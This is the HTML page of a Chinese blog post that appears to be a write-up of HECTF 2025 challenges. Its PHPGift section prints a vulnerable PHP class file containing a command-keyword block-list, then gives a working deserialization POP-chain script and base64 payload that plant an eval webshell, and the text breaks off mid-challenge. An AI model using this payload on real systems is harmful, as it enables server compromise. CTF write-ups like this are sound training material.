



<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta name="referrer" content="no-referrer"/>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="golden的部落阁" href="http://blog.g01den.top/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="golden的部落阁" href="http://blog.g01den.top/atom.xml" />
<link rel="alternate" type="application/json" title="golden的部落阁" href="http://blog.g01den.top/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  
  <meta name="keywords" content="Game" />


<link rel="canonical" href="http://blog.g01den.top/posts/215f7d8b.html">



  <title>
【2025】HECTF - CTFer的比赛之路 |
golden的部落阁 = golden的部落阁 = subtitle写得真好</title>
<meta name="generator" content="Hexo 7.2.0"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">【2025】HECTF
  </h1>
  
<div class="meta">
  <span class="item" title="创建时间：2026-02-05 17:24:52">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">发表于</span>
    <time itemprop="dateCreated datePublished" datetime="2026-02-05T17:24:52+08:00">2026-02-05</time>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="切换导航栏">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">golden的部落阁</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
          <img src="https://s2.loli.net/2026/02/05/1AEoGQY978gNXtC.png">
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/Game/" itemprop="item" rel="index" title="分类于 CTFer的比赛之路"><span itemprop="name">CTFer的比赛之路</span></a>
<meta itemprop="position" content="1" /></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
  <link itemprop="mainEntityOfPage" href="http://blog.g01den.top/posts/215f7d8b.html">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content="g01den">
    <meta itemprop="description" content="subtitle写得真好, golden的部落阁">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="golden的部落阁">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <pre><code>	第一天打得头疼眼睛疼，我以为是被脑洞给干烂了，结果是tm感冒了，回去吃个药秒好了，但是脑洞太难蚌了，第二天打舞萌去了，没解后面的题了，不过幸好没看，后面有些题还真不大好写。
</code></pre>
<h1 id="web"><a class="markdownIt-Anchor" href="#web">#</a> Web：</h1>
<h2 id="老爷爷的金块"><a class="markdownIt-Anchor" href="#老爷爷的金块">#</a> <strong>老爷爷的金块</strong></h2>
<blockquote>
<p>现在不知不觉 2025 年了，曾经在 4399 里遨游的小孩儿也变成大人了… 重新看了一遍 4399 的经典游戏，想起了这个努力挖矿的老爷爷。 下载附件，打开 exe，重温童年的乐趣！</p>
<p><strong>提示 1</strong>1. 请注意获得的 flag 第六段前面有一个空格哦～</p>
</blockquote>
<p>​		 打开是个游戏，打完就有 flag，当然分数要过 1000<br>
<img data-src="https://i-blog.csdnimg.cn/direct/761a2f79d1814c4e8f2c958d2bd43b70.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		另外一个想法，就是，浏览文件，发现 bk_flag.png 等多个图片，winhex 打开，搜索 flag，不知道为啥 IDA 里没有，找到了这个：</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/51c9a624a8184b109669b285687065f2.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		把这个交上去看看，成功。</p>
<h2 id="phpgift"><a class="markdownIt-Anchor" href="#phpgift">#</a> <strong>PHPGift</strong></h2>
<p>​		ctrl+u 看到：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- hhhhhh!!!! where is xxx.php --&gt;</span></span><br></pre></td></tr></table></figure>
<p>​		提示是三字文件，flag 上面有个 ser 是唯一三字符的读读看：</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/7513e1f76e20416796b6959d6edd04ec.png#pic_center" alt="在这里插入图片描述"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fileHandle</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fileName</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$fileName</span> = <span class="string">&#x27;data.txt&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fileName = <span class="variable">$fileName</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fileHandle = <span class="title function_ invoke__">fopen</span>(<span class="variable">$fileName</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fileHandle) &#123;</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$this</span>-&gt;fileHandle);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;fileName; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$settings</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;settings[<span class="variable">$key</span>] ?? <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;settings[<span class="variable">$key</span>] = <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySessionHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sessionId</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sessionId = <span class="title function_ invoke__">uniqid</span>(<span class="string">&#x27;sess_&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$userData</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;userData[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;userData[<span class="variable">$name</span>] ?? <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;params) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;data) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$this</span>-&gt;data) === <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;params);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CacheManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cacheDir</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$ttl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$dir</span> = <span class="string">&#x27;/tmp/cache&#x27;</span>, <span class="variable">$ttl</span> = <span class="number">3600</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cacheDir = <span class="variable">$dir</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ttl = <span class="variable">$ttl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">error_log</span>(<span class="string">&quot;[Cache] Destroyed manager for <span class="subst">&#123;$this-&gt;cacheDir&#125;</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logFile</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$logFile</span> = <span class="string">&#x27;app.log&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logFile = <span class="variable">$logFile</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setLogFile</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logFile = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$message</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;logFile, <span class="variable">$message</span> . PHP_EOL, FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$msg</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="variable">$msg</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserProfile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$email</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User: <span class="subst">&#123;$this-&gt;name&#125;</span> (<span class="subst">&#123;$this-&gt;email&#125;</span>)&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;email;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MathHelper</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$factor</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$x</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$x</span> * <span class="variable language_">$this</span>-&gt;factor; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/bash|sh|exec|system|passthru|`|eval|assert/i&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Hacker?\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$input</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Done.\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		pop 链。</p>
<p>​		链子思路大概是 <code>Logger</code>  中的 <code>__invoke</code> ，触发之后调用 <code>log</code>  进行任意文件写，在这里写入木马即可，那么调用 <code>__invoke</code>  的点可以是 <code>User</code>  中的 <code>call_user_func</code> ， <code>__toString</code>  可以由 <code>FileHandler</code>  中的 <code>echo $this-&gt;fileName; </code> 触发，再向上就是 <code>__destruct</code> ，其他杂七杂八的类和方法太多了，看上去这个题难，结果一看好像不难，生成 payload 如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fileHandle</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fileName</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$userData</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span> = <span class="string">&#x27;&lt;? eval($_POST[1]) ?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logFile</span>=<span class="string">&quot;upload.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$logger</span> = <span class="keyword">new</span> <span class="title class_">Logger</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;fileName = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;fileName-&gt;data = [<span class="variable">$logger</span>,<span class="string">&quot;__invoke&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#TzoxMToiRmlsZUhhbmRsZXIiOjI6e3M6MTA6ImZpbGVIYW5kbGUiO047czo4OiJmaWxlTmFtZSI7Tzo0OiJVc2VyIjozOntzOjg6InVzZXJEYXRhIjtOO3M6NDoiZGF0YSI7YToyOntpOjA7Tzo2OiJMb2dnZXIiOjE6e3M6NzoibG9nRmlsZSI7czoxMDoidXBsb2FkLnBocCI7fWk6MTtzOjg6Il9faW52b2tlIjt9czo2OiJwYXJhbXMiO3M6MjE6Ijw/IGV2YWwoJF9QT1NUWzFdKSA/PiI7fX0=</span></span><br></pre></td></tr></table></figure>
<p>​		之后访问 <code>upload.php</code>  拿到 shell，传参是 1。</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/641775d3f4a948c7bb1421efb6a55750.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		base64 解码得到： <code>HECTF&#123;c0ngr4ts_l1ttl3_h4ck3r_y0u_f0und_my_53cr3t_g1ft&#125;</code></p>
<h2 id="像素勇者和神秘宝藏"><a class="markdownIt-Anchor" href="#像素勇者和神秘宝藏">#</a> <strong>像素勇者和神秘宝藏</strong></h2>
<p>​		三个门，有用代码如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> courage = <span class="number">0</span>; <span class="comment">// 初始勇气值</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">updateDisplay</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;courage-display&#x27;</span>).<span class="property">textContent</span> = courage;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">buyPotion</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            courage += <span class="number">50</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">updateDisplay</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">enter</span>(<span class="params">door</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (door === <span class="string">&#x27;A&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (courage &lt; <span class="number">10000</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">alert</span>(<span class="string">&quot;⚠️ 勇气不足！需要至少 10000 点才能挑战 Door A！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// 扣除 5000 勇气</span></span></span><br><span class="line"><span class="language-javascript">                courage -= <span class="number">5000</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">updateDisplay</span>();</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">fetch</span>(<span class="string">&#x27;/enter&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">headers</span>: &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">body</span>: <span class="string">`door=<span class="subst">$&#123;door&#125;</span>&amp;courage=<span class="subst">$&#123;courage&#125;</span>`</span></span></span><br><span class="line"><span class="language-javascript">            &#125;)</span></span><br><span class="line"><span class="language-javascript">            .<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> r.<span class="title function_">json</span>())</span></span><br><span class="line"><span class="language-javascript">            .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">alert</span>(data.<span class="property">msg</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (data.<span class="property">flag</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&#x27;/victory?flag=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(data.<span class="property">flag</span>);</span></span><br><span class="line"><span class="language-javascript">                    &#125;, <span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;)</span></span><br><span class="line"><span class="language-javascript">            .<span class="title function_">catch</span>(<span class="function"><span class="params">e</span> =&gt;</span> <span class="title function_">alert</span>(<span class="string">&#x27;请求失败&#x27;</span>));</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">updateDisplay</span>();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    A: 